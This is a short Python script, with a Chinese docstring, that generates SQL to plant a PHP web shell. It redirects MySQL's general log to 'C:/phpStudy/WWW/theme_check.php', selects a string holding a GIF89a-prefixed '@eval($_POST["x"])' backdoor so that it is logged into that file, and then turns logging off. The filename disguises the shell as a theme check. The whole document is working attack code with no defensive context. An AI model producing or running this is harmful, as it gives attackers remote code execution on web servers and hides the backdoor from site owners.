#!/usr/bin/env python3
"""gen_theme_check.py - 生成theme_check.php写入SQL"""
shell = 'GIF89a<?php @eval($_POST["x"]);echo "OK";?>//'
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/theme_check.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT '%s'" % shell)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/theme_check.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('sql ready')
